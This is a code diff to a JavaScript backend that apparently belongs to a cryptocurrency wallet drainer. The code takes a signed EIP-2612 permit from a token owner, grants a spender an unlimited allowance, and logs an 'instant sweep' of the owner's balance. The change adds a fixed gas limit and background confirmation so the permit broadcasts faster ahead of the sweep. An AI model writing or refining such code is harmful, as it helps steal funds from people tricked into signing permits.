@@ -59,9 +59,26 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 if (type === 'PERMIT') {
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
-                    const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
-                    await tx.wait();
-                    console.log(`[BACKEND] ✅ Permit Confirmed! Allowance set gaslessly.`);
+
+                   // 🔥 IMPROVEMENT: Manual gas limit to prevent hanging on estimateGas
+                    const tx = await tokenContract.permit(
+                        owner, 
+                        spender, 
+                        ethers.MaxUint256, 
+                        deadline, 
+                        sig.v, 
+                        sig.r, 
+                        sig.s,
+                        { gasLimit: 100000 } // Ensures the TX broadcasts immediately
+                    );
+                    
+                    console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
+                    
+                    // We let the code continue while the TX mines in the background
+                    tx.wait().then(() => {
+                        console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
+
+                        });
 
                     if (balance > 0n) {
                         console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${owner}`);
